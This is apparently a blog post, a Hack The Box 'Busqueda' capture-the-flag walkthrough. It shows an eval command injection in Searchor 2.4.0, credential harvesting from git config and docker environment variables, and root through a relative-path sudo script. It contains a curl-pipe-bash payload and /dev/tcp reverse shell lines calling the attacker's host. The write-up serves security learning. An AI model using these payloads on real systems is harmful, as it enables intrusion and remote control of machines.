@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Hack The Box: Busqueda - Journal</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Busqueda is an easy machine from hackthebox. It starts with a vulnerable version of Searchor that can be abused to inject arbitrary shell commands due to a bad use of the eval function. After our shell as www-data we inspect log files from a git repository to find credentials for the user. That user can run a particular python script as root that we can use to elevate our privileges." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Hack The Box: Busqueda" />
+<meta property="og:description" content="Busqueda is an easy machine from hackthebox. It starts with a vulnerable version of Searchor that can be abused to inject arbitrary shell commands due to a bad use of the eval function. After our shell as www-data we inspect log files from a git repository to find credentials for the user. That user can run a particular python script as root that we can use to elevate our privileges." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://danp.bz/posts/hackthebox-busqueda/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-05T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-09-05T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack The Box: Busqueda"/>
+<meta name="twitter:description" content="Busqueda is an easy machine from hackthebox. It starts with a vulnerable version of Searchor that can be abused to inject arbitrary shell commands due to a bad use of the eval function. After our shell as www-data we inspect log files from a git repository to find credentials for the user. That user can run a particular python script as root that we can use to elevate our privileges."/>
+<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,500&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://danp.bz/css/main.5a1df495afe53092e2ad0c172adb2250810f442ca165c5f85673cb3b860f3468.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://danp.bz/css/dark.134db564d2aacf16987413a93acdb0fdfe7ada0bd1972f2871066b32c9277a7b.css"  disabled />
+	
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://danp.bz/">Journal</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/whoami">Whoami</a>
+		
+		<a href="/tags">Tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="https://danp.bz/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Hack The Box: Busqueda</h1>
+			<div class="meta">Posted on Sep 5, 2023</div>
+		</div>
+		
+
+		<section class="body">
+			<ul>
+<li><a href="#overview">Overview</a></li>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#searchor-240">Searchor 2.4.0</a></li>
+<li><a href="#shell-as-svc">Shell as svc</a></li>
+<li><a href="#detecting-root-path">Detecting Root Path</a></li>
+<li><a href="#exploiting-some-python-scripts">Exploiting some python scripts</a></li>
+</ul>
+<h1 id="overview">Overview</h1>
+<ol>
+<li>Identify and exploit the vulnerable of Searchor</li>
+<li>Enumerate logs from a git repository to find user crendentials</li>
+<li>As this user, run a python script that lets us inspect enviroment variables from docker containers</li>
+<li>Obtain administrator credentials to log in gitea</li>
+<li>Analyze the script to spot a path misuse from an imported file</li>
+<li>Get root</li>
+</ol>
+<h1 id="nmap">Nmap</h1>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>danp@local:~|⇒  nmap -sV -sC 10.10.11.208
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-09 21:04 -03
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.208
+</span></span><span style="display:flex;"><span>Host is up (0.094s latency).
+</span></span><span style="display:flex;"><span>Not shown: 998 closed tcp ports (conn-refused)
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://searcher.htb/
+</span></span><span style="display:flex;"><span>Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 28.75 seconds
+</span></span></code></pre></div><ul>
+<li><code>-sV</code>: Enumerate versions from the services</li>
+<li><code>-sC</code>: Run some nmap&rsquo;s default scripts</li>
+</ul>
+<p>We can see that we get redirected to <code>searcher.htb</code>, let&rsquo;s update our <code>/etc/hosts</code> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>danp@local:~|⇒  cat /etc/hosts
+</span></span><span style="display:flex;"><span>##
+</span></span><span style="display:flex;"><span># Host Database
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span># localhost is used to configure the loopback interface
+</span></span><span style="display:flex;"><span># when the system is booting.  Do not change this entry.
+</span></span><span style="display:flex;"><span>##
+</span></span><span style="display:flex;"><span>127.0.0.1	localhost
+</span></span><span style="display:flex;"><span>255.255.255.255	broadcasthost
+</span></span><span style="display:flex;"><span>::1             localhost
+</span></span><span style="display:flex;"><span>10.10.11.208	searcher.htb
+</span></span></code></pre></div><p>Taking a look at the website we see a couple of interesting info:</p>
+<p><img src="/busqueda-img/Searcher.png" alt="img1"></p>
+<ol>
+<li>It is running <a href="https://flask.palletsprojects.com/en/2.3.x/">Flask</a>, so we are working with python here</li>
+<li><a href="https://github.com/ArjunSharda/Searchor">Searchor</a> 2.4.0</li>
+</ol>
+<p>Before we even interact with the app, let&rsquo;s do a quick google search for possible exploits for this version.</p>
+<p><img src="/busqueda-img/snyk.png" alt="img2"></p>
+<h1 id="searchor-240">Searchor 2.4.0</h1>
+<p>This Snyk <a href="https://security.snyk.io/package/pip/searchor/2.4.0">page</a> tells us that our version is vulnerable to arbitrary command execution due to an unsafe use of <code>eval</code>. That&rsquo;s a very strong cadidate for us to exploit, let&rsquo;s try to find on the github repository the vulnerable code to see our case applies and we can exploit it. Since <strong>Snyk</strong> told us that version 2.4.2 is fixed, let&rsquo;s see its release page:</p>
+<p><img src="/busqueda-img/github-patch1.png" alt="img3"></p>
+<p>Fortunately we see a reference for the patch commit</p>
+<p><img src="/busqueda-img/github2.png" alt="img4"></p>
+<p>We see the vulnerable code highlighted in red. It takes what appers to be two users&rsquo; input and throws them part of the arguments for the <code>eval</code> function. This function will basically take any string passed as argument as code and execute it no questions asked, we have spot our vulnerability here.</p>
+<p>Let&rsquo;s go back a bit to see how we can send those values, <code>engine</code> and <code>query</code> to the server. As we saw above, the website has only one form, let&rsquo;s intercept it wih burp:</p>
+<p><img src="/busqueda-img/burp.png" alt="img5"></p>
+<p>Perfect, we control both of the variables, let&rsquo;s build our payload. The original function is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>url = eval(<span style="color:#0086d2">f</span><span style="color:#0086d2">&#34;Engine.</span><span style="color:#0086d2">{</span>engine<span style="color:#0086d2">}</span><span style="color:#0086d2">.search(&#39;</span><span style="color:#0086d2">{</span>query<span style="color:#0086d2">}</span><span style="color:#0086d2">&#39;, copy_url=</span><span style="color:#0086d2">{</span>copy<span style="color:#0086d2">}</span><span style="color:#0086d2">, open_web=</span><span style="color:#0086d2">{</span>open<span style="color:#0086d2">}</span><span style="color:#0086d2">))&#34;</span>
+</span></span></code></pre></div><p>Our payload would look something like this on the server side:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>url = eval(<span style="color:#0086d2">f</span><span style="color:#0086d2">&#34;Engine.</span><span style="color:#0086d2">{</span>engine<span style="color:#0086d2">}</span><span style="color:#0086d2">.search(&#39;&#39;,__import__(&#39;os&#39;).system(&#39;curl 10.10.14.71/index.html | bash&#39;))#&#39;))&#34;</span>
+</span></span></code></pre></div><p>Since everything after the <code>#</code> is commented out we don&rsquo;t need to send them on our request. The payload we send is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0086d2">&#39;,__import__(&#39;</span>os<span style="color:#0086d2">&#39;).system(&#39;</span>curl <span style="color:#0086f7;font-weight:bold">10.10.14.71</span>/index.html | bash<span style="color:#0086d2">&#39;))#</span>
+</span></span></code></pre></div><p>the <code>index.html</code> file is just a trick to download a bash script without specifying a filename and auto execute it with the pipe (|) <code>bash</code></p>
+<p>This is what the <code>index.html</code> file looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic"></span>sh -i &gt;&amp; /dev/tcp/10.10.14.71/9001 0&gt;&amp;<span style="color:#0086f7;font-weight:bold">1</span>
+</span></span></code></pre></div><p>We successfuly get a shell as <code>svc</code> user:</p>
+<p><img src="/busqueda-img/shell-www-data.png" alt="img6"></p>
+<p>We can read <code>user.txt</code> with this user, now let&rsquo;s focus on elevate our privileges.</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>svc
+</span></span><span style="display:flex;"><span>$ cat user.txt
+</span></span><span style="display:flex;"><span>1e9&lt;redacted&gt;83b9
+</span></span></code></pre></div><h1 id="shell-as-svc">Shell as svc</h1>
+<p>Now that we have internal access, let&rsquo;s begin our enumeration!</p>
+<p>Inside the <code>/home</code> folder of <code>svc</code>, we see a <code>.gitconfig</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>$ cat .gitconfig
+</span></span><span style="display:flex;"><span>[user]
+</span></span><span style="display:flex;"><span>	email = cody@searcher.htb
+</span></span><span style="display:flex;"><span>	name = cody
+</span></span><span style="display:flex;"><span>[core]
+</span></span><span style="display:flex;"><span>	hooksPath = no-hooks
+</span></span></code></pre></div><p>Let&rsquo;s save this cody user for future references. Browsing to <code>/var/www/app/</code> we detect that it is a git folder. Let&rsquo;s take a look at the logs</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>$ git log
+</span></span><span style="display:flex;"><span>commit 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4
+</span></span><span style="display:flex;"><span>Author: administrator &lt;administrator@gitea.searcher.htb&gt;
+</span></span><span style="display:flex;"><span>Date:   Sun Dec 25 12:14:21 2022 +0000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Initial commit
+</span></span></code></pre></div><p>We spot another name <code>gitea.searcher.htb</code>, adding it to our <code>/etc/hosts</code> file&hellip;</p>
+<p><img src="/busqueda-img/gitea.png" alt="img7"></p>
+<p>We find a gitea page but no creds 😢. While I was doing the box I hoped to find commits from the <code>cody</code> user we saw earlier, so I grepped his name inside the <code>/var/www/app</code> folder recursively. To my surprise the output was better than expected</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>$ grep -ir &#34;cody&#34; 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>.git/config:	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+</span></span></code></pre></div><p>we get <code>cody:jh1usoih2bkjaspwe92</code> as credentials. Using this credential to login to gitea does not give any new information to us, so it&rsquo;s no use here. However, it password can be used to ssh in as <code>svc</code>.</p>
+<ul>
+<li>User: svc</li>
+<li>Password: jh1usoih2bkjaspwe92</li>
+</ul>
+<h1 id="detecting-root-path">Detecting Root Path</h1>
+<p><code>sudo -l</code> reveals that we can run a particular python script as root. Let&rsquo;s try to exploit it to get root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>svc@busqueda:~$ sudo -l
+</span></span><span style="display:flex;"><span>[sudo] password for svc:
+</span></span><span style="display:flex;"><span>Matching Defaults entries for svc on busqueda:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+</span></span><span style="display:flex;"><span>    use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User svc may run the following commands on busqueda:
+</span></span><span style="display:flex;"><span>    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+</span></span></code></pre></div><p>Unfortunately we cannot read the source, so let&rsquo;s just run it to see what it does</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+</span></span><span style="display:flex;"><span>Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     docker-ps     : List running docker containers
+</span></span><span style="display:flex;"><span>     docker-inspect : Inpect a certain docker container
+</span></span><span style="display:flex;"><span>     full-checkup  : Run a full system checkup
+</span></span></code></pre></div><p>We can run three differente commands as described above. Running the <code>docker-ps</code> argument we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+</span></span><span style="display:flex;"><span>[sudo] password for svc:
+</span></span><span style="display:flex;"><span>CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
+</span></span><span style="display:flex;"><span>960873171e2e   gitea/gitea:latest   &#34;/usr/bin/entrypoint…&#34;   5 months ago   Up 8 hours   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+</span></span><span style="display:flex;"><span>f84a6b33fb5a   mysql:8              &#34;docker-entrypoint.s…&#34;   5 months ago   Up 8 hours   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
+</span></span></code></pre></div><p>We see two containers running the gitea service, one for the app and the other serving as database. If you a are a little bit familiar with docker containers and how they interact with each other on the same docker network, it is very common to send values through environment variables. The <code>docker-inspect</code> argument can help us with this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#34;{{json .Config.Env }}&#34; gitea | jq
+</span></span><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>  &#34;USER_UID=115&#34;,
+</span></span><span style="display:flex;"><span>  &#34;USER_GID=121&#34;,
+</span></span><span style="display:flex;"><span>  &#34;GITEA__database__DB_TYPE=mysql&#34;,
+</span></span><span style="display:flex;"><span>  &#34;GITEA__database__HOST=db:3306&#34;,
+</span></span><span style="display:flex;"><span>  &#34;GITEA__database__NAME=gitea&#34;,
+</span></span><span style="display:flex;"><span>  &#34;GITEA__database__USER=gitea&#34;,
+</span></span><span style="display:flex;"><span>  &#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&#34;,
+</span></span><span style="display:flex;"><span>  &#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;,
+</span></span><span style="display:flex;"><span>  &#34;USER=git&#34;,
+</span></span><span style="display:flex;"><span>  &#34;GITEA_CUSTOM=/data/gitea&#34;
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>We find a credential <code>gitea:yuiu1hoiu4i5ho1uh</code> but it does not help us much right now. After struggling a little here, I decided to try this password with the administrator user we saw earlier on the gitea app.</p>
+<p><img src="/busqueda-img/admin-gitea.png" alt="img8"></p>
+<h1 id="exploiting-some-python-scripts">Exploiting some python scripts</h1>
+<p>Luckly we get in! Accessing the <code>/scripts</code> repository, it lets us see  the code from the script folder. (Line 45 - 52)</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">elif</span> action == <span style="color:#0086d2">&#39;full-checkup&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">try</span>:
+</span></span><span style="display:flex;"><span>            arg_list = [<span style="color:#0086d2">&#39;./full-checkup.sh&#39;</span>]
+</span></span><span style="display:flex;"><span>            print(run_command(arg_list))
+</span></span><span style="display:flex;"><span>            print(<span style="color:#0086d2">&#39;[+] Done!&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">except</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#0086d2">&#39;Something went wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#0086f7;font-weight:bold">1</span>)
+</span></span></code></pre></div><p>We see a vulnerability here. If we call the full-checkup option, the script tries to run a <code>./full-checkup.sh</code> from our current directory, it should have specified <code>/opt/scripts/full-checkup.sh</code> as it was doing for the rest. All we have to do is create another <code>full-checkup.sh</code> in a differente folder to execute any code we want.</p>
+<p>Using the same code as before to spawn a shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic"></span>sh -i &gt;&amp; /dev/tcp/10.10.14.71/9001 0&gt;&amp;<span style="color:#0086f7;font-weight:bold">1</span>
+</span></span></code></pre></div><p>Save that to <code>/dev/shm/full-checkup.sh</code> and run <code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</code> from the <code>/dev/shm</code> folder. (Don&rsquo;t forget to <code>chmod +x full-checkup.sh</code> 😎)</p>
+<p><img src="/busqueda-img/root-shell.png" alt="img9"></p>
+<p>That&rsquo;s all folks 🐇</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/hackthebox">hackthebox</a></li>
+					
+					<li><a href="/tags/easy">easy</a></li>
+					
+					<li><a href="/tags/command-injection">command injection</a></li>
+					
+					<li><a href="/tags/gitea">gitea</a></li>
+					
+					<li><a href="/tags/searchor">searchor</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/D4n-P" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/dan_ps__" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/danielspatricio/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    Feel free to reach me at any of my social media 🎃
+  </div>
+</footer>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-164145585-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
